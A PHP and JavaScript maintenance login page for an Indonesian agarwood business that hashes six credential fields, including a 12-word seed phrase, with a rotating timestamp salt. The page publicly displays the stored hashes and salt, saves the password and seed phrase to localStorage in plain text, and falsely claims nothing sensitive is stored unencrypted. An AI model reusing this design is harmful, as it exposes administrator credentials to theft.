<?php
session_start();

// Database connection
require_once 'database.php';

$error_message = '';
$success_message = '';

// Debug mode
$debug_mode = false; // Set to true to enable debug mode

// Function untuk generate hash dengan timestamp salt yang sama
function generateLoginHash($data, $timestamp_salt) {
    return [
        'username_hash' => hash('sha256', $data['username'] . $timestamp_salt),
        'password_hash' => hash('sha256', $data['password'] . $timestamp_salt),
        'namaayah_hash' => hash('sha256', $data['namaayah'] . $timestamp_salt),
        'namaibu_hash' => hash('sha256', $data['namaibu'] . $timestamp_salt),
        'tanggallahir_hash' => hash('sha256', $data['tanggallahir'] . $timestamp_salt),
        'seedphrase_hash' => hash('sha256', $data['seedphrase'] . $timestamp_salt)
    ];
}

// Auto-update hash setiap request
include_once 'hash-updater.php';

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';
    $namaayah = trim($_POST['namaayah'] ?? '');
    $namaibu = trim($_POST['namaibu'] ?? '');
    $tanggallahir = $_POST['tanggallahir'] ?? '';
    $seedphrase = trim($_POST['seedphrase'] ?? '');
    
    // Validation
    if (empty($username) || empty($password) || empty($namaayah) || empty($namaibu) || empty($tanggallahir) || empty($seedphrase)) {
        $error_message = 'Semua field harus diisi!';
    } else {
        // Validasi 12 kata unik
        $kata_array = explode(' ', trim($seedphrase));
        $kata_array = array_filter($kata_array);
        
        if (count($kata_array) !== 12) {
            $error_message = 'Harus ada tepat 12 kata unik yang dipisahkan dengan spasi!';
        } else {
            try {
                // Get current hash dari database
                $stmt = $pdo->prepare("SELECT * FROM loginmaintainance WHERE is_active = 1 ORDER BY id LIMIT 1");
                $stmt->execute();
                $db_data = $stmt->fetch(PDO::FETCH_ASSOC);
                
                if ($db_data) {
                    // Generate hash dari input user dengan timestamp salt yang sama
                    $current_time = time();
                    $timestamp_salt = $db_data['hash_timestamp'];
                    
                    // Coba dengan timestamp salt saat ini dan sebelumnya (untuk toleransi)
                    $current_salt = floor($current_time / 10);
                    $previous_salt = $current_salt - 1;
                    
                    $input_data = [
                        'username' => $username,
                        'password' => $password,
                        'namaayah' => $namaayah,
                        'namaibu' => $namaibu,
                        'tanggallahir' => $tanggallahir,
                        'seedphrase' => $seedphrase
                    ];
                    
                    // Coba dengan current salt
                    $input_hashes_current = generateLoginHash($input_data, $current_salt);
                    $input_hashes_previous = generateLoginHash($input_data, $previous_salt);
                    
                    // Debugging
                    if ($debug_mode) {
                        echo "<pre>";
                        echo "Current Salt: " . $current_salt . "\n";
                        echo "Previous Salt: " . $previous_salt . "\n";
                        echo "DB Data: " . print_r($db_data, true) . "\n";
                        echo "Input Hashes (Current): " . print_r($input_hashes_current, true) . "\n";
                        echo "Input Hashes (Previous): " . print_r($input_hashes_previous, true) . "\n";
                        echo "</pre>";
                    }
                    
                    // Bandingkan hash
                    $login_success = false;
                    
                    // Check dengan current salt
                    if ($input_hashes_current['username_hash'] === $db_data['username_hash'] &&
                        $input_hashes_current['password_hash'] === $db_data['password_hash'] &&
                        $input_hashes_current['namaayah_hash'] === $db_data['namaayah_hash'] &&
                        $input_hashes_current['namaibu_hash'] === $db_data['namaibu_hash'] &&
                        $input_hashes_current['tanggallahir_hash'] === $db_data['tanggallahir_hash'] &&
                        $input_hashes_current['seedphrase_hash'] === $db_data['seedphrase_hash']) {
                        $login_success = true;
                        $debug_message = "Login successful with current salt.";
                    }
                    
                    // Check dengan previous salt (toleransi)
                    if (!$login_success &&
                        $input_hashes_previous['username_hash'] === $db_data['username_hash'] &&
                        $input_hashes_previous['password_hash'] === $db_data['password_hash'] &&
                        $input_hashes_previous['namaayah_hash'] === $db_data['namaayah_hash'] &&
                        $input_hashes_previous['namaibu_hash'] === $db_data['namaibu_hash'] &&
                        $input_hashes_previous['tanggallahir_hash'] === $db_data['tanggallahir_hash'] &&
                        $input_hashes_previous['seedphrase_hash'] === $db_data['seedphrase_hash']) {
                        $login_success = true;
                        $debug_message = "Login successful with previous salt.";
                    }
                    
                    if ($login_success) {
                        // Login successful
                        $_SESSION['maintenance_logged_in'] = true;
                        $_SESSION['maintenance_username'] = $username;
                        $_SESSION['maintenance_login_time'] = time();
                        $_SESSION['maintenance_hash_salt'] = $current_salt;
                        
                        header('Location: create-admin-user.php');
                        exit;
                    } else {
                        $error_message = 'Data yang Anda masukkan tidak sesuai dengan sistem keamanan!';
                        if ($debug_mode) {
                            $error_message .= " Debug: " . $debug_message;
                        }
                    }
                } else {
                    $error_message = 'Sistem maintenance tidak tersedia!';
                }
            } catch(PDOException $e) {
                $error_message = 'Terjadi kesalahan sistem. Silakan coba lagi.';
                error_log("Maintenance login error: " . $e->getMessage());
            }
        }
    }
}

// Get current hash data for display
try {
    $stmt = $pdo->prepare("SELECT * FROM loginmaintainance WHERE is_active = 1 ORDER BY id LIMIT 1");
    $stmt->execute();
    $current_hash_data = $stmt->fetch(PDO::FETCH_ASSOC);
} catch(PDOException $e) {
    $current_hash_data = null;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Maintenance Login - Exotic Agarwood Indonesia</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #1c0c00 0%, #2a1200 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }

        .main-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            max-width: 900px;
            width: 100%;
        }
        
        /* Panel Base Style */
        .panel {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        
        /* Hash Panel - Left Side */
        .hash-panel {
            border-left: 4px solid #af7b00;
        }
        
        .hash-header {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .hash-icon {
            width: 50px;
            height: 50px;
            background: #af7b00;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
        }
        
        .hash-icon i {
            color: white;
            font-size: 20px;
        }
        
        .hash-title {
            color: #af7b00;
            font-size: 18px;
            font-weight: bold;
            margin: 0;
        }
        
        .hash-subtitle {
            color: #666;
            font-size: 12px;
            margin: 0;
        }
        
        .hash-countdown {
            background: #eff6ff;
            border: 1px solid #bfdbfe;
            border-radius: 8px;
            padding: 10px;
            text-align: center;
            margin: 15px 0;
        }
        
        .hash-countdown-text {
            color: #af7b00;
            font-size: 14px;
            font-weight: bold;
            margin: 0;
        }
        
        .hash-countdown-sub {
            color: #666;
            font-size: 11px;
            margin: 0;
        }
        
        .hash-display {
            margin-bottom: 15px;
        }
        
        .hash-item {
            margin-bottom: 12px;
        }
        
        .hash-label {
            font-size: 11px;
            font-weight: bold;
            color: #374151;
            text-transform: uppercase;
            margin-bottom: 3px;
        }
        
        .hash-value {
            background: #f3f4f6;
            border-radius: 6px;
            padding: 8px;
            font-family: 'Courier New', monospace;
            font-size: 10px;
            color: #6b7280;
            word-break: break-all;
            line-height: 1.2;
        }
        
        .hash-info {
            background: #eff6ff;
            border: 1px solid #bfdbfe;
            border-radius: 8px;
            padding: 10px;
            margin-top: 15px;
        }
        
        .hash-info-text {
            font-size: 11px;
            color: #1e40af;
            margin: 0;
        }
        
        /* Login Panel - Right Side */
        .login-panel {
            border-left: 4px solid #af7b00;
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .login-icon {
            width: 50px;
            height: 50px;
            background: #af7b00;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
        }
        
        .login-icon i {
            color: white;
            font-size: 20px;
        }
        
        .login-title {
            color: #af7b00;
            font-size: 18px;
            font-weight: bold;
            margin: 0;
        }
        
        .login-subtitle {
            color: #666;
            font-size: 12px;
            margin: 0;
        }
        
        .login-countdown {
            background: #f3f4f6;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            padding: 10px;
            text-align: center;
            margin: 15px 0;
        }
        
        .login-countdown-text {
            color: #af7b00;
            font-size: 14px;
            font-weight: bold;
            margin: 0;
        }
        
        .login-countdown-sub {
            color: #666;
            font-size: 11px;
            margin: 0;
        }
        
        /* Form Styles */
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-label {
            font-size: 12px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 5px;
            display: flex;
            align-items: center;
        }
        
        .form-label i {
            margin-right: 8px;
            color: #6b7280;
        }
        
        .form-control {
            border: 1px solid #d1d5db;
            border-radius: 8px;
            padding: 10px 12px;
            font-size: 14px;
            width: 100%;
            transition: all 0.2s;
        }
        
        .form-control:focus {
            outline: none;
            border-color: #af7b00;
            box-shadow: 0 0 0 3px rgba(175, 123, 0, 0.1);
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }
        
        .textarea-control {
            min-height: 80px;
            resize: vertical;
        }
        
        .word-counter {
            font-size: 11px;
            color: #6b7280;
            margin-top: 5px;
        }
        
        .word-counter.valid {
            color: #059669;
        }
        
        .word-counter.invalid {
            color: #dc2626;
        }
        
        .btn-login {
            background: linear-gradient(135deg, #af7b00 0%, #d4941a 100%);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px;
            font-size: 14px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-login:hover {
            background: linear-gradient(135deg, #916700 0%, #af7b00 100%);
        }
        
        .security-note {
            background: #fef2f2;
            border: 1px solid #fecaca;
            border-radius: 8px;
            padding: 10px;
            margin-top: 15px;
        }
        
        .security-note-text {
            font-size: 11px;
            color: #dc2626;
            margin: 0;
        }
        
        .alert {
            background: #fef2f2;
            border: 1px solid #fecaca;
            border-radius: 8px;
            padding: 10px;
            margin-bottom: 15px;
        }
        
        .alert-text {
            font-size: 12px;
            color: #dc2626;
            margin: 0;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .main-container {
                grid-template-columns: 1fr;
                gap: 15px;
                max-width: 500px;
            }
            
            .form-row {
                grid-template-columns: 1fr;
            }
        }
        
        /* Countdown Animation */
        .countdown-urgent {
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .auto-update-text {
            color: #6b7280;
        }

        .countdown-urgent {
            color: #af7b00;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <!-- Hash Security System Panel -->
        <div class="panel hash-panel">
            <div class="hash-header">
                <div class="hash-icon">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <h3 class="hash-title">Hash Security System</h3>
                <p class="hash-subtitle">Real-time SHA256 Hash Monitor</p>
            </div>
            
            <div class="hash-countdown">
                <p class="hash-countdown-text" id="hashCountdownText">
                    <i class="fas fa-sync-alt fa-spin"></i> Hash update dalam: <span id="hashCountdown">10</span> detik
                </p>
                <p class="hash-countdown-sub auto-update-text">Auto-refresh setiap 10 detik</p>
            </div>
            
            <div class="hash-display">
                <?php if ($current_hash_data): ?>
                    <div class="hash-item">
                        <div class="hash-label">USERNAME HASH</div>
                        <div class="hash-value"><?php echo htmlspecialchars($current_hash_data['username_hash']); ?></div>
                    </div>
                    
                    <div class="hash-item">
                        <div class="hash-label">PASSWORD HASH</div>
                        <div class="hash-value"><?php echo htmlspecialchars($current_hash_data['password_hash']); ?></div>
                    </div>
                    
                    <div class="hash-item">
                        <div class="hash-label">NAMA AYAH HASH</div>
                        <div class="hash-value"><?php echo htmlspecialchars($current_hash_data['namaayah_hash']); ?></div>
                    </div>
                    
                    <div class="hash-item">
                        <div class="hash-label">NAMA IBU HASH</div>
                        <div class="hash-value"><?php echo htmlspecialchars($current_hash_data['namaibu_hash']); ?></div>
                    </div>
                    
                    <div class="hash-item">
                        <div class="hash-label">TANGGAL LAHIR HASH</div>
                        <div class="hash-value"><?php echo htmlspecialchars($current_hash_data['tanggallahir_hash']); ?></div>
                    </div>
                    
                    <div class="hash-item">
                        <div class="hash-label">SEED PHRASE HASH</div>
                        <div class="hash-value"><?php echo htmlspecialchars($current_hash_data['seedphrase_hash']); ?></div>
                    </div>
                <?php else: ?>
                    <div class="alert">
                        <p class="alert-text">Tidak ada data hash yang tersedia</p>
                    </div>
                <?php endif; ?>
            </div>
            
            <?php if ($current_hash_data): ?>
                <div class="hash-info">
                    <p class="hash-info-text">
                        <i class="fas fa-info-circle"></i> Hash Timestamp: <?php echo date('H:i d-m-Y', $current_hash_data['hash_timestamp']); ?><br>
                        Salt: <?php echo htmlspecialchars($current_hash_data['hash_timestamp']); ?>
                    </p>
                </div>
            <?php endif; ?>
        </div>
        
        <!-- Secure Maintenance Access Panel -->
        <div class="panel login-panel">
            <div class="login-header">
                <div class="login-icon">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <h3 class="login-title">Secure Maintenance Access</h3>
                <p class="login-subtitle">Sistem Keamanan Berlapis dengan Hash Dinamis</p>
            </div>
            
            <div class="login-countdown">
                <p class="login-countdown-text" id="loginCountdownText">
                    <i class="fas fa-sync-alt fa-spin"></i> Hash akan diperbarui dalam: <span id="loginCountdown">10</span> detik
                </p>
                <p class="login-countdown-sub auto-update-text">Sistem keamanan menggunakan SHA256 dengan salt dinamis</p>
            </div>
            
            <?php if ($error_message): ?>
                <div class="alert">
                    <p class="alert-text">
                        <i class="fas fa-exclamation-triangle"></i> <?php echo htmlspecialchars($error_message); ?>
                    </p>
                </div>
            <?php endif; ?>
            
            <form method="POST" action="" id="maintenanceForm">
                <div class="form-group">
                    <label class="form-label">
                        <i class="fas fa-user"></i> Username
                    </label>
                    <input type="text" class="form-control" id="username" name="username" required>
                </div>
                
                <div class="form-group">
                    <label class="form-label">
                        <i class="fas fa-lock"></i> Password
                    </label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">
                            <i class="fas fa-male"></i> Nama Ayah
                        </label>
                        <input type="text" class="form-control" id="namaayah" name="namaayah" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">
                            <i class="fas fa-female"></i> Nama Ibu
                        </label>
                        <input type="text" class="form-control" id="namaibu" name="namaibu" required>
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="form-label">
                        <i class="fas fa-calendar"></i> Tanggal Lahir
                    </label>
                    <input type="date" class="form-control" id="tanggallahir" name="tanggallahir" required>
                </div>
                
                <div class="form-group">
                    <label class="form-label">
                        <i class="fas fa-key"></i> 12 Kata Unik (Seed Phrase)
                    </label>
                    <textarea class="form-control textarea-control" id="seedphrase" name="seedphrase" required></textarea>
                    <div class="word-counter" id="wordCounter">Jumlah kata: 0/12</div>
                </div>
                
                <button type="submit" class="btn-login">
                    <i class="fas fa-shield-alt"></i> Akses Secure Maintenance
                </button>
            </form>
            
            <div class="security-note">
                <p class="security-note-text">
                    <i class="fas fa-exclamation-triangle"></i> <strong>Sistem Keamanan Tingkat Tinggi:</strong> Semua data di-hash dengan SHA256 + salt dinamis yang berubah setiap 10 detik. Tidak ada data sensitif yang disimpan dalam bentuk plain text.
                </p>
            </div>
        </div>
    </div>
    
    <script>
// Variables untuk tracking user activity
let userIsTyping = false;
let lastInteractionTime = 0;

// Form data management
function saveFormData() {
    const formData = {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value,
        namaayah: document.getElementById('namaayah').value,
        namaibu: document.getElementById('namaibu').value,
        tanggallahir: document.getElementById('tanggallahir').value,
        seedphrase: document.getElementById('seedphrase').value
    };
    localStorage.setItem('maintenanceFormData', JSON.stringify(formData));
}

function loadFormData() {
    const savedData = localStorage.getItem('maintenanceFormData');
    if (savedData) {
        const formData = JSON.parse(savedData);
        Object.keys(formData).forEach(key => {
            const element = document.getElementById(key);
            if (element && formData[key]) {
                element.value = formData[key];
            }
        });
    }
}

function trackUserInteraction() {
    userIsTyping = true;
    lastInteractionTime = Date.now();
    
    setTimeout(() => {
        if (Date.now() - lastInteractionTime >= 3000) {
            userIsTyping = false;
        }
    }, 3000);
}

// COUNTDOWN TIMER FUNCTION
function updateCountdown() {
    const now = Math.floor(Date.now() / 1000);
    const remaining = 10 - (now % 10);
    
    // Update both countdown displays
    const hashCountdownElement = document.getElementById('hashCountdown');
    const loginCountdownElement = document.getElementById('loginCountdown');
    const hashCountdownText = document.getElementById('hashCountdownText');
    const loginCountdownText = document.getElementById('loginCountdownText');
    
    if (hashCountdownElement) {
        hashCountdownElement.textContent = remaining;
    }
    
    if (loginCountdownElement) {
        loginCountdownElement.textContent = remaining;
    }
    
    // Visual effects for urgent countdown
    if (remaining <= 3) {
        if (hashCountdownText) hashCountdownText.classList.add('countdown-urgent');
        if (loginCountdownText) loginCountdownText.classList.add('countdown-urgent');
    } else {
        if (hashCountdownText) hashCountdownText.classList.remove('countdown-urgent');
        if (loginCountdownText) loginCountdownText.classList.remove('countdown-urgent');
    }
    
    // Save form data before potential reload
    if (remaining <= 2) {
        saveFormData();
    }
    
    // Auto-reload with user protection
    if (remaining === 1) {
        setTimeout(() => {
            const timeSinceLastInteraction = Date.now() - lastInteractionTime;
            const hasActiveFocus = document.activeElement && 
                                 (document.activeElement.tagName === 'INPUT' || 
                                  document.activeElement.tagName === 'TEXTAREA');
            
            // Only reload if user is not actively using the form
            if (!userIsTyping && timeSinceLastInteraction > 5000 && !hasActiveFocus) {
                window.location.reload();
            }
        }, 1000);
    }
}

// Word counter for seed phrase
function setupWordCounter() {
    const seedphraseInput = document.getElementById('seedphrase');
    const wordCounter = document.getElementById('wordCounter');
    
    if (seedphraseInput && wordCounter) {
        seedphraseInput.addEventListener('input', function() {
            trackUserInteraction();
            
            const text = this.value.trim();
            const words = text ? text.split(/\s+/).filter(word => word.length > 0) : [];
            const wordCount = words.length;
            
            wordCounter.textContent = `Jumlah kata: ${wordCount}/12`;
            
            if (wordCount === 12) {
                wordCounter.className = 'word-counter valid';
            } else {
                wordCounter.className = 'word-counter invalid';
            }
            
            saveFormData();
        });
    }
}

// Setup form interaction tracking
function setupFormTracking() {
    document.querySelectorAll('input, textarea').forEach(input => {
        input.addEventListener('input', function() {
            trackUserInteraction();
            saveFormData();
        });
        
        input.addEventListener('focus', trackUserInteraction);
        input.addEventListener('keydown', trackUserInteraction);
        input.addEventListener('keyup', trackUserInteraction);
    });
}

// Form validation
function setupFormValidation() {
    const form = document.getElementById('maintenanceForm');
    if (form) {
        form.addEventListener('submit', function(e) {
            const seedphrase = document.getElementById('seedphrase').value.trim();
            const words = seedphrase ? seedphrase.split(/\s+/).filter(word => word.length > 0) : [];
            
            if (words.length !== 12) {
                e.preventDefault();
                alert('Harus ada tepat 12 kata unik untuk seed phrase!');
                return false;
            }
            
            // Clear saved data on successful submit
            localStorage.removeItem('maintenanceFormData');
        });
    }
}

// Initialize everything when page loads
document.addEventListener('DOMContentLoaded', function() {
    // Load saved form data
    loadFormData();
    
    // Setup all functionality
    setupWordCounter();
    setupFormTracking();
    setupFormValidation();
    
    // Trigger word count if there's existing content
    const seedphraseInput = document.getElementById('seedphrase');
    if (seedphraseInput && seedphraseInput.value) {
        seedphraseInput.dispatchEvent(new Event('input'));
    }
});

// Handle page visibility changes
document.addEventListener('visibilitychange', function() {
    if (userIsTyping) {
        saveFormData();
    }
});

// Save data before page unload
window.addEventListener('beforeunload', function() {
    saveFormData();
});

// START THE COUNTDOWN TIMER
setInterval(updateCountdown, 1000);
updateCountdown();
</script>
</body>
</html>
